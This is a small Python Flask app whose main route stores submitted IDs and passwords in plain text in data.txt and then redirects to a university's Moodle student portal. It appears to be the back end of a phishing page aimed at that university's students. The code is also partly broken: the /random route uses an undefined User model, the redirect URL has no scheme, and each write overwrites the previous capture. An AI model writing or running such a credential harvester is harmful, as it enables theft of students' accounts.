from flask import Flask, redirect, render_template, request


app = Flask(__name__)

@app.route("/", methods= ["POST"] )
def main():
    if request.method == "POST":
        id = request.form.get('id')
        password = request.form.get("password")
        
        with open('data.txt', "w")as data:
            data.write(id)
            data.write('\n')
            data.write(password)
            data.write('\n')
        
        return redirect('moodle.smuc.edu.et/students/')

@app.route("/random")
def random():
    users = User.query.all()
    return render_template('users.html', users=users)
if __name__ == '__main__':

    app.run()
